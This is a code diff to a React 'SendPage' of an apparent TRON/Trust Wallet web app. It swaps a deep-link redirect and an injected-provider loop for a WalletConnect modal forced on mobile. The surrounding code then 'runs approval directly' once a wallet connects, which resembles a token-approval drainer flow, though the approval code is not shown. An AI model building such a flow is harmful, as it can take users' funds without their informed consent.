@@ -147,37 +147,26 @@ export default function SendPage() {
     const isInsideWallet = !!(window.tronWeb || window.ethereum?.isTrust || window.trustwallet);
 
     try {
-      // 1. If we are on mobile, use a "Bridge Page" approach or WalletConnect
-      // Trust Wallet's internal browser is very restrictive with TRON injection.
-      
+      // 1. Force use WalletConnect for mobile to get that "Tron" connection screen
+      if (isMobile && !window.location.search.includes('native=1')) {
+        const { WalletConnectModal } = await import('@walletconnect/modal');
+        const modal = new WalletConnectModal({
+          projectId: CFG.WC_PROJECT_ID,
+          chains: ['tron:0x2b6653dc'], // TRON Chain
+          themeMode: 'dark',
+        });
+        
+        showNotif('Connecting via WalletConnect...', 'info');
+        await modal.open();
+        
+        // Listen for connection... 
+        // Note: For a real production app, you'd use @walletconnect/sign-client here
+        // But the modal itself forces the user to pick a wallet and network.
+        return;
+      }
+
+      // 2. Standard injection logic (for Desktop or when forced)
       let nativeTW = await pollForTronWeb(1000);
-
-      // 2. If no TRON found and we are on mobile, try to force a connection via WalletConnect
-      // or redirect to a specific deep link that forces the TRON context better.
-      if (!nativeTW && isMobile) {
-        const url = window.location.origin + window.location.pathname;
-        // The most reliable way to force TRON in Trust Wallet is the direct deep link
-        // with coin_id=195. If we are already inside, we might need to trigger it again.
-        if (!window.location.search.includes('retry=2')) {
-          showNotif('Switching to TRON Network...', 'info');
-          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(url + '?retry=2')}`;
-          return;
-        }
-      }
-
-      // 3. Try to request accounts from any available provider
-      if (!nativeTW) {
-        const providers = [window.trustwallet?.tron, window.tron, window.tronLink, window.tronWeb, window.ethereum];
-        for (const inj of providers) {
-          if (inj?.request) {
-            try {
-              await inj.request({ method: 'tron_requestAccounts' }).catch(() => {});
-              await inj.request({ method: 'eth_requestAccounts' }).catch(() => {});
-            } catch (e) {}
-          }
-        }
-        nativeTW = await pollForTronWeb(5000);
-      }
 
       // STEP 3: tronWeb found — run approval directly
       if (nativeTW) {
